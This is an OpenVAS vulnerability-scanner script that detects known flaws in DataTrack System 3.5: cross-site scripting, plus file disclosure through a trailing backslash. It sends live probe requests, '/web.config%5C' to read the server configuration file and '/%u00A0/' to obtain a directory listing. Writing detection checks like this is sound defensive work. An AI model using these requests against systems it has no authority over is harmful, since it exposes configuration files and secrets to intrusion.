##############################################################################
# OpenVAS Vulnerability Test
#
# DataTrack System Multiple Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902062");
  script_version("2019-05-14T08:13:05+0000");
  script_tag(name:"last_modification", value:"2019-05-14 08:13:05 +0000 (Tue, 14 May 2019)");
  script_tag(name:"creation_date", value:"2010-06-01 15:40:11 +0200 (Tue, 01 Jun 2010)");
  script_cve_id("CVE-2010-2043", "CVE-2010-2078", "CVE-2010-2079");
  script_bugtraq_id(40249);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("DataTrack System Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/39868");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/58732");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/58735");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/58734");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/1005-exploits/datatrackserver35-xss.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_datatrack_system_detect.nasl");
  script_require_ports("Services/www", 81);
  script_mandatory_keys("datatrack_system/detected");

  script_tag(name:"insight", value:"The flaws are due to,

  - An input passed via the 'Work_Order_Summary' parameter to 'Home.aspx' in
  the 'DataTrack Web Client' is not properly sanitised before being displayed to the user.

  - An improper validation of user supplied input, which can be exploited to
  disclose the contents of the 'root' directory, read arbitrary files, via a
  trailing backslash in a 'URL'.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running DataTrack System and is prone to multiple
  vulnerabilities.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML code in a user's browser session in the context of an affected
  site and to obtain sensitive information.");

  script_tag(name:"affected", value:"DataTrack System version 3.5(3.5.8019.4)");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("version_func.inc");

dtsPort = get_http_port(default:81);

dtsVer = get_kb_item("www/" + dtsPort + "/DataTrack_System");
if(!dtsVer)
  exit(0);

url = string("/web.config%5C");
sndReq = http_get(item:url, port:dtsPort);
rcvRes = http_send_recv(port:dtsPort, data:sndReq);

if("<configuration>" >< rcvRes || "<system.web>" >< rcvRes) {
  report = report_vuln_url(port:dtsPort, url:url);
  security_message(port:dtsPort, data:report);
  exit(0);
}

url = string("/%u00A0/");
sndReq = http_get(item:url, port:dtsPort);
rcvRes = http_send_recv(port:dtsPort, data:sndReq);

if(">Directory Listing" >< rcvRes) {
  if("Bin/" >< rcvRes || "Web.config" >< rcvRes){
    report = report_vuln_url(port:dtsPort, url:url);
    security_message(port:dtsPort, data:report);
  }
}
